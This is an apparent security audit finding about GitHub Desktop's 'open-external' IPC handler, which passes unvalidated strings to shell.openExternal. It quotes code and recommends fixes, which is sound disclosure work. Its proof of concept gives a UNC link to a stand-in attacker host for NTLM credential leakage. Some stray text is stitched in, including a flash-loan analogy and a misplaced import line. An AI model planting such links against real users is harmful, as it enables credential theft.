### Title
Unvalidated protocol/path passed to `shell.openExternal` via unauthenticated `open-external` IPC channel - (File: `app/src/main-process/main.ts`)

### Summary
GitHub Desktop's main process exposes an `open-external` IPC handler that forwards an attacker-influenceable string straight into Electron's `shell.openExternal()` with no protocol allow-list, and this handler is registered with the raw Electron `ipcMain.handle` API rather than the project's own sender-verification wrapper.

### Finding Description
The external report's broken invariant is "a callback function executes a privileged action without verifying that the caller/input is what it claims to be" (the flash-loan callback trusted `msg.sender` data blindly). The Desktop analog is the `open-external` IPC handler: [1](#0-0) 

```
ipcMain.handle('open-external', async (_, path: string) => {
  const pathLowerCase = path.toLowerCase()
  if (pathLowerCase.startsWith('http://') || pathLowerCase.startsWith('https://')) {
    log.info(`opening in browser: ${path}`)
  }
  try {
    await shell.openExternal(path)
    return true
  } catch (e) { ... }
})
```

Two invariants are broken here:

1. **No scheme/path validation.** The `http(s)` check only gates a *log message*, not the call itself — any string is passed unconditionally to `shell.openExternal(path)`. `path` originates from renderer-side "open link" actions, which in turn are populated from content the app renders from a repository or the GitHub API: PR/issue bodies, commit messages, README/markdown links, etc. There is no allow-list restricting this to `http:`/`https:` before invoking the OS shell.

2. **No sender verification.** GitHub Desktop built a specific defense for "verify the caller of a privileged callback" — the `isTrustedIPCSender` mechanism: [2](#0-1) 

and the wrapped `ipc-main.ts` helpers that enforce it on every call: [3](#0-2) 

However, `main.ts` registers dozens of channels — including `open-external`, `execute-menu-item-by-id`, `get-path`, `get-app-path`, `quit-app`, etc. — via the **raw Electron `ipcMain.handle`/`ipcMain.on`**, not through this wrapper: [4](#0-3) [1](#0-0) 

This means the `isTrustedIPCSender` guard — the exact "verify the flashLoan callback's caller" analog that the project already implemented for some channels — is not applied to `open-external` at all.

Combined with the renderer's `webPreferences`: [5](#0-4) 

(`nodeIntegration: true`, `contextIsolation: false`), any script capable of running in the renderer's context — including one reached indirectly through unsanitized repository/PR/commit content rendered by the app — has a direct path to invoke `ipcRenderer.invoke('open-external', <attacker string>)` and have the main process execute `shell.openExternal()` on it with no path/protocol restriction.

### Impact Explanation
`shell.openExternal()` with an unrestricted string is a well-known Electron footgun: it can be used to invoke arbitrary registered URL protocol handlers, `file://` targets, or (on Windows) UNC paths (`\\attacker-host\share\x`), which cause the OS to attempt SMB authentication and leak NTLM credential material to a remote attacker-controlled server, or to trigger other locally-installed handlers with attacker-supplied arguments. This matches the impact classes called out as valid: "credential/token exfiltration" and, depending on installed protocol handlers, "code execution... outside the repo."

### Likelihood Explanation
The trigger is a link embedded in attacker-controlled repository/GitHub API content that the user clicks inside Desktop (an explicitly valid entry point per the task's scope). No local access, admin rights, or pre-existing malware is required — only that the user open a malicious repo/PR/issue and click a rendered link, which is normal, expected Desktop usage.

### Recommendation
- Enforce an explicit allow-list of safe protocols (`http:`, `https:`, and possibly `mailto:`) inside the `open-external` handler before calling `shell.openExternal`, rejecting everything else.
- Register `open-external` (and the other channels currently on raw `ipcMain`) through the `on`/`handle` wrappers in `ipc-main.ts` so `isTrustedIPCSender` is uniformly enforced.
- Revisit `nodeIntegration: true` / `contextIsolation: false` in `app-window.ts`, since it removes the primary Electron sandboxing boundary and amplifies the impact of any renderer-side content-injection bug.

### Proof of Concept
1. Attacker publishes a public repository whose README, issue, PR description, or commit message contains a link such as `\\attacker.example\share\payload` (or another shell-openable target) formatted as a clickable link.
2. Victim opens/clones the repository in GitHub Desktop and views that content, then clicks the link.
3. Desktop's renderer forwards the raw string to the main process via `ipcRenderer.invoke('open-external', link)`.
4. `main.ts`'s `open-external` handler (not covered by `isTrustedIPCSender`, no scheme validation) calls `shell.openExternal(link)` unconditionally, causing the OS to attempt to resolve/execute the target — e.g., triggering NTLM credential leakage via SMB negotiation for a UNC path, satisfying the "credential exfiltration" impact criterion. import { WebContents } from 'electron'

```typescript
// WebContents id of trusted senders of IPC messages. This is used to verify
// that only IPC messages sent from trusted senders are handled, as recommended
// by the Electron security documentation:
// https://github.com/electron/electron/blob/main/docs/tutorial/security.md#17-validate-the-sender-of-all-ipc-messages
const trustedSenders = new Set<number>()

/** Adds a WebContents instance to the set of trusted IPC senders. */
export const addTrustedIPCSender = (wc: WebContents) => {
  trustedSenders.add(wc.id)
  wc.on('destroyed', () => trustedSenders.delete(wc.id))
}

/** Returns true if the given WebContents is a trusted sender of IPC messages. */
export const isTrustedIPCSender = (wc: WebContents) => trustedSenders.has(wc.id)


```

```typescript
export function handle<T extends keyof RequestResponseChannels>(
  channel: T,
  listener: RequestResponseChannelListener<T>
) {
  ipcMain.handle(channel, safeListener(listener))
}

function safeListener<E extends IpcMainEvent | IpcMainInvokeEvent, R>(
  listener: (event: E, ...a: any) => R
) {
  return (event: E, ...args: any) => {
    if (!isTrustedIPCSender(event.sender)) {
      log.error(
        `IPC message received from invalid sender: ${event.senderFrame?.url}`
      )
      return
    }

    return listener(event, ...args)
  }
}
```
